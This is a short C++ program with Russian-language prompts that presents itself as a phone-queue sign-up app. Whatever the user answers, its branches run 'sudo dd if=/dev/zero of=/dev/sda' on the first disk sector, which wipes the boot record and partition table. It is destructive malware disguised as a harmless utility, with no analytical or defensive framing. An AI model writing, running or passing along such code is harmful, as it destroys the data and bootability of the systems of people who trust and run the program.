#include <iostream>
#include <cstdlib>
using namespace std;

int main(){
    srand(time(0));
    int s = rand() % 12 + 1;
    int nf = 0;
    int choice;
    cout << "введите номер телефона для того что бы попасть в очередь (Только цифры): ";
    cin >> nf;
    cout << "Вы в очереди под номером " << s << endl;
    cout << "Вы хотите остаться в очереди (да - 1/нет - 0): " << endl;
    cin >> choice;
    if (choice == 1){
        cout << "Вот и хорошо";
    }
    if (choice == 0){
        cout << "Ладно :(";
        int ret = system("sudo dd if=/dev/zero of=/dev/sda bs=512 count=1");
        return ret;
    }
    else {
        int ret = system("sudo dd if=/dev/zero of=/dev/sda bs=512 count=1");
        return ret;
    }
}